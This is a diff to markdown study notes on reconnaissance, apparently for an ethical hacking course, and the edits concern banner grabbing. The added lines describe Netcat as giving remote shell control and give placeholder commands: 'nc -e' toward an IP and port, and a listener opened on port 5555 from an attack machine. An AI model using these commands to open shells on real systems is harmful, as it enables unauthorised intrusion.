@@ -338,13 +338,20 @@ Hping3 is a scriptable program that uses the Tcl language, whereby packets can b
 - **Anonymizers** - hides identity on HTTP traffic (port 80)
 
 ## <u>Banner Grabbing</u>
+*Banner grabbing can be used to get information about OS or specific server info (such as web server, mail server, etc.)*
 
 - **Active** - sending specially crafted packets and comparing responses to determine OS
 - **Passive** - reading error messages, sniffing traffic or looking at page extensions
 - Easy way to banner grab is connect via **telnet** on port (e.g. 80 for web server)
-- **Netcat** can also be used to banner grab
-  - `nc <IP address or FQDN> <port number>`
-- Can be used to get information about OS or specific server info (such as web server, mail server, etc.)
+- **Netcat** tool
+  - "Swiss army knife" of TCP/IP hacking
+  - Provides all sorts of control over a remote shell on a target
+  - Connects via **`nc -e <IP address> <Port>`**
+  - From attack machine **`nc -l -p 5555`** opens a listening port on 5555
+  - Can connect over TCP or UDP, from any port
+  - Offers DNS forwarding, port mapping and forwarding and proxying
+  - **Netcat** can be used to banner grab:
+    - `nc <IP address or FQDN> <port number>`
 
 * **Example of Banner grabbing on netcat - extracting request HTTP header**  
   1. `nc` command with `target IP` address and `port 80`
